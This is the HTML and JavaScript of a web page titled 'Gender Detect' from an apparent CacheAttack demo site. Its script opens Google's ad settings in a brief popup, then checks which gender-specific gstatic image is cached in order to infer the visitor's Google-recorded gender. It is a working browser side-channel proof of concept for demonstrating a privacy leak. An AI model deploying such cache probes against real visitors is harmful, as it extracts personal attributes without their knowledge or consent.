<!DOCTYPE html>
<html>
<head>
<title>CacheAttack</title>
<meta name="keywords" content="html,css,javascript,cache">
<meta name="author" content="NDev">
<meta name="description" CONTENT="Time based attack">
<link rel="stylesheet" href="/main.css">
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
<link rel="icon" href="/favicon.ico" type="image/x-icon">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
<script src="https://cache.ndev.tk/embed.js"></script>
</head>
<body>
<nav class="navbar navbar-expand-sm bg-dark navbar-dark">
   <a class="navbar-brand" style="color:red">
      <img src="https://ndev.tk/icon.webp" class="d-inline-block align-top" alt="CacheAttack">CacheAttack</a>
  <ul class="navbar-nav">
    <li class="nav-item">
      <a class="nav-link" href="http://cache.ndev.tk">Main</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="http://cache.ndev.tk/network">Network</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="http://cache.ndev.tk/files">Files</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="http://cache.ndev.tk/Gender">Gender</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="http://cache.ndev.tk/youtube">Youtube</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="https://github.com/NDevTK/CacheAttack/tree/master/Gender">Code</a>
    </li>
    <li class="nav-item">
      <a class="nav-link" href="https://ndev.tk">HUB</a>
    </li>
  </ul>
</nav>
<div class="jumbotron">
<h1>Welcome to Gender Detect</h1>
<p class="lead">Detects Gender via <a href="https://adssettings.google.com/authenticated">Google Ad personalization</a> cache.</p>
<button onclick="getGender()">Click!</button>
<br><h2 id="gender"></h2>
</body>
<script>
Rules = new Map();

async function getGender() {
	var ads = open("https://adssettings.google.com/authenticated");
	setTimeout(async _  => ads.close(), 500);
	setTimeout(async _  => {
		var result = await GenderDetect();
		gender.innerText = "Result: "+ result;
	}, 1000);
}

async function getRules() {
	Gender("Female");
	Gender("Male");
	return Rules
}

function Gender(g) {
	Rules.set("https://www.gstatic.com/identity/boq/adssettingsui/demographic/i_gender_"+g.toLowerCase()+"_ee2fb99c014437125dfe9358e4ea50aa.svg", g);
}

async function AdPref() {
	return await ifCached("https://www.gstatic.com/identity/boq/adssettingsui/demographic/i_age_ee6695b8688539f7175e364579d4a749.svg");
}

async function GenderDetect() {
	var Test = await AdPref();
	if(!Test) return "Ad personalization is OFF";
	var images = await getWebsites();
	if(images.length > 1) return "Multiple genders cached";
	return (images.length === 1) ? images[0] : "Rather not say";
}
</script>
